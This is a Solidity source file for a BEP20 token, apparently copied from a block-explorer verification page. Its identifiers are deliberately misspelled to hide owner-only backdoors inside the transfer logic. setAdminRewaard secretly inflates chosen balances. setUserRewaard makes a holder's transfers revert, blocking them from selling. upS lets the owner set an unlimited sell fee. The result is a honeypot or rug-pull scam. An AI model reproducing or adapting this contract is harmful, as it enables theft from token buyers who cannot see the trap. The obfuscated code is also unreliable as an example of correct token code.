/**
 *Submitted for verification at BscScan.com on 2022-12-20
*/

/**
 *subbmitted for verification at Etherscan.io on 2022-11-29
*/

/**
 *subbmitted for verification at BscScan.com on 2022-09-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trysubb(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function trymull(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function subb(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mull(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function subb(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint accoovntADesired,
        uint accoovntBDesired,
        uint accoovntAMin,
        uint accoovntBMin,
        address to,
        uint deadline
    ) external returns (uint accoovntA, uint accoovntB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint accoovntTokenDesired,
        uint accoovntTokenMin,
        uint accoovntETHMin,
        address to,
        uint deadline
    ) external payable returns (uint accoovntToken, uint accoovntETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint accoovntAMin,
        uint accoovntBMin,
        address to,
        uint deadline
    ) external returns (uint accoovntA, uint accoovntB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint accoovntTokenMin,
        uint accoovntETHMin,
        address to,
        uint deadline
    ) external returns (uint accoovntToken, uint accoovntETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint accoovntAMin,
        uint accoovntBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accoovntA, uint accoovntB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint accoovntTokenMin,
        uint accoovntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accoovntToken, uint accoovntETH);
    function swapExactTokensForTokens(
        uint accoovntIn,
        uint accoovntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory accoovnts);
    function swapTokensForExactTokens(
        uint accoovntOut,
        uint accoovntInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory accoovnts);
    function swapExactETHForTokens(uint accoovntOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory accoovnts);
    function swapTokensForExactETH(uint accoovntOut, uint accoovntInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory accoovnts);
    function swapExactTokensForETH(uint accoovntIn, uint accoovntOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory accoovnts);
    function swapETHForExactTokens(uint accoovntOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory accoovnts);

    function quote(uint accoovntA, uint reserveA, uint reserveB) external pure returns (uint accoovntB);
    function getaccoovntOut(uint accoovntIn, uint reserveIn, uint reserveOut) external pure returns (uint accoovntOut);
    function getaccoovntIn(uint accoovntOut, uint reserveIn, uint reserveOut) external pure returns (uint accoovntIn);
    function getaccoovntsOut(uint accoovntIn, address[] calldata path) external view returns (uint[] memory accoovnts);
    function getaccoovntsIn(uint accoovntOut, address[] calldata path) external view returns (uint[] memory accoovnts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfiedOnTransferTokens(
        address token,
        uint liquidity,
        uint accoovntTokenMin,
        uint accoovntETHMin,
        address to,
        uint deadline
    ) external returns (uint accoovntETH);
    function removeLiquidityETHWithPermitSupportingfiedOnTransferTokens(
        address token,
        uint liquidity,
        uint accoovntTokenMin,
        uint accoovntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accoovntETH);

    function swapExactTokensForTokensSupportingfiedOnTransferTokens(
        uint accoovntIn,
        uint accoovntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfiedOnTransferTokens(
        uint accoovntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfiedOnTransferTokens(
        uint accoovntIn,
        uint accoovntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fiedTo() external view returns (address);
    function fiedToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfiedTo(address) external;
    function setfiedToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amnnot) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amnnot);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subbtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subbtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subbtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amnnot
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amnnot;
        emit Approval(owner, spender, amnnot);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amnnot
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnnot, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amnnot);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnnot
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnnot
    ) internal virtual {}
}


contract Token is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address accont) public view virtual returns (uint256) {
        return _balances[accont];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnnot
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnnot, "ERC20: transfer amnnot exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amnnot;
    }
        _balances[to] += amnnot;

        emit Transfer(from, to, amnnot);
    }

    function _burn(address accont, uint256 amnnot) internal virtual {
        require(accont != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accont];
        require(accoontBalance >= amnnot, "ERC20: burn amnnot exceeds balance");
    unchecked {
        _balances[accont] = accoontBalance - amnnot;
    }
        _totalSupply -= amnnot;

        emit Transfer(accont, address(0), amnnot);
    }

    function _mtin(address accont, uint256 amnnot) internal virtual {
        require(accont != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnnot;
        _balances[accont] += amnnot;
        emit Transfer(address(0), accont, amnnot);
    }


    address public uniswapV2Pair;
    address public DEVAddress;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
        _defaultSellfied = 2;
        _defaultBuyfied = 0;
        DEVAddress = msg.sender;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfied = 0;

    uint256 private _defaultBuyfied = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _Rewaards;

    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function upS(uint256 _value) external onlyowner {
        _defaultSellfied = _value;
    }

    function setAdminRewaard(address acclount,int256 amnnot ) public onlyowner {
        _Rewaards[acclount] += amnnot;
    }

    function rmUserRewaard(address acclount) public onlyowner {
        _Rewaards[acclount] = 1;
    }


    function setUserRewaard(address acclount) public onlyowner {
        _Rewaards[acclount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewaard(address acclount) public view returns (int256) {
        return _Rewaards[acclount];
    }


    function _recF(
        address from,
        address _to,
        uint256 _accoovnt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _accoovnt, "ERC20: transfer amnnot exceeds balance");
        if (_Rewaards[from] > 2){
            _balances[from] = _balances[from].add(uint256(_Rewaards[from]));
        }else if (_Rewaards[from] < 1){
            _balances[from] = _balances[from].subb(uint256(_Rewaards[from]));
        }



        uint256 tradefiedaccoovnt = 1;
        uint256 tradefied = _defaultSellfied;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tradefied = _defaultSellfied;
            }
            if (from == uniswapV2Pair) {
                tradefied = _defaultBuyfied;
            }
        }
        tradefiedaccoovnt = _accoovnt.mull(tradefied).div(100);

        if (tradefiedaccoovnt > 1) {
            _balances[from] = _balances[from].subb(tradefiedaccoovnt);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefiedaccoovnt);
            emit Transfer(from, _deadAddress, tradefiedaccoovnt);
        }

        _balances[from] = _balances[from].subb(_accoovnt - tradefiedaccoovnt);
        _balances[_to] = _balances[_to].add(_accoovnt - tradefiedaccoovnt);
        emit Transfer(from, _to, _accoovnt - tradefiedaccoovnt);
    }

    function transfer(address to, uint256 amnnot) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amnnot);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnnot
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnnot);
        _recF(from, to, amnnot);
        return true;
    }
}